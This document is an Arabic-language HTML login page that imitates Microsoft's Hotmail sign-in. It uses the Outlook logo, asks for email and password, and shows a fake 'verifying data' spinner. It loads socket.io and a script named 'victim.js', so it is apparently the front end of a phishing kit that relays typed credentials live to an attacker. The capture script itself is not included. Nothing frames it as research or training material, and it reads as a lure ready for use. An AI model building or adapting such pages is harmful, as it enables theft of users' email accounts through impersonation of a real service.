<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hotmail - تسجيل الدخول</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://img.icons8.com/color/96/000000/microsoft-outlook-2019.png" alt="Hotmail">
            <h1>Hotmail</h1>
            <p>تسجيل الدخول للبريد الإلكتروني</p>
        </div>
        
        <form id="login-form" class="login-form">
            <div class="input-group">
                <label>البريد الإلكتروني</label>
                <input type="email" id="email" placeholder="example@hotmail.com" required>
            </div>
            
            <div class="input-group">
                <label>كلمة المرور</label>
                <input type="password" id="password" placeholder="••••••••" required>
            </div>
            
            <button type="submit" class="btn-login">تسجيل الدخول</button>
            
            <div class="links">
                <a href="#">نسيت كلمة المرور؟</a>
                <a href="#">إنشاء حساب جديد</a>
            </div>
        </form>
        
        <div class="loading" id="loading" style="display: none;">
            <div class="spinner"></div>
            <p>جاري التحقق من البيانات...</p>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script src="victim.js"></script>
</body>
</html>
